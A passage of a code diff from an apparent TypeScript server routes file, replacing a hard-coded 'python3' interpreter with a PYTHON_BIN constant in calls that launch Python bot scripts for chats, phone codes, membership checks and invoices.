         let output = "";
         let settled = false;
-        const proc = spawn("python3", ["-u", script, type, String(chatId).trim(), String(msgLimit)], {
+        const proc = spawn(PYTHON_BIN, ["-u", script, type, String(chatId).trim(), String(msgLimit)], {
           cwd: botDir,
           env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
           timeout: 300000,
@@ -3126,7 +3486,7 @@ export async function registerRoutes(
       const result = await new Promise<string>((resolve, reject) => {
         let output = "";
         let settled = false;
-        const proc = spawn("python3", ["-u", script, skClean], {
+        const proc = spawn(PYTHON_BIN, ["-u", script, skClean], {
           cwd: botDir,
           env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
           timeout: 30000,
@@ -3240,7 +3600,7 @@ export async function registerRoutes(
       const result = await new Promise<string>((resolve, reject) => {
         let output = "";
         let settled = false;
-        const proc = spawn("python3", ["-u", script, "send_code", phone], {
+        const proc = spawn(PYTHON_BIN, ["-u", script, "send_code", phone], {
           cwd: botDir,
           env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
           timeout: 30000,
@@ -3277,7 +3637,7 @@ export async function registerRoutes(
       const result = await new Promise<string>((resolve, reject) => {
         let output = "";
         let settled = false;
-        const proc = spawn("python3", ["-u", script, ...args], {
+        const proc = spawn(PYTHON_BIN, ["-u", script, ...args], {
           cwd: botDir,
           env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
           timeout: 30000,
@@ -3301,7 +3661,7 @@ export async function registerRoutes(
   function runPythonScript(scriptPath: string, args: string[], cwd: string, timeout = 15000): Promise<string> {
     return new Promise((resolve, reject) => {
       let output = "";
-      const proc = spawn("python3", ["-u", scriptPath, ...args], {
+      const proc = spawn(PYTHON_BIN, ["-u", scriptPath, ...args], {
         cwd,
         env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
         timeout,
@@ -3734,7 +4094,7 @@ export async function registerRoutes(
       } catch {}
 
       const botDir = path.resolve(process.cwd(), "bot");
-      const pythonPath = process.env.PYTHON_PATH || "python3";
+      const pythonPath = process.env.PYTHON_PATH || PYTHON_BIN;
       const durationDisplay = useHours ? String(keyHours) + "h" : String(days);
 
       execFile(pythonPath, [path.join(botDir, "send_invoice.py"), "invoice", userId, plan, durationDisplay, upperKey], { timeout: 15000 }, () => {});
@@ -3878,7 +4238,7 @@ export async function registerRoutes(
       try {
         const botDir = path.resolve(process.cwd(), "bot");
         const checkScript = path.join(botDir, "check_member.py");
-        const pythonPath = process.env.PYTHON_PATH || "python3";
+        const pythonPath = process.env.PYTHON_PATH || PYTHON_BIN;
         const memberResult = await new Promise<string>((resolve) => {
           execFile(pythonPath, [checkScript, userId], { timeout: 12000, cwd: botDir }, (_err: any, stdout: string) => {
             resolve(stdout?.trim() || '{"member":false,"status":"error"}');
@@ -4027,7 +4387,7 @@ export async function registerRoutes(
     } catch {}
 
     // Notify user via bot
-    const pythonPath = process.env.PYTHON_PATH || "python3";
+    const pythonPath = process.env.PYTHON_PATH || PYTHON_BIN;
     const botDir = path.resolve(process.cwd(), "bot");
     execFile(pythonPath, [path.join(botDir, "send_invoice.py"), "invoice", userId, plan, String(days), "REFERRAL_BALANCE"], { timeout: 15000 }, () => {});
     execFile(pythonPath, [path.join(botDir, "send_invoice.py"), "log", userId, userName, plan, String(days)], { timeout: 15000 }, () => {});
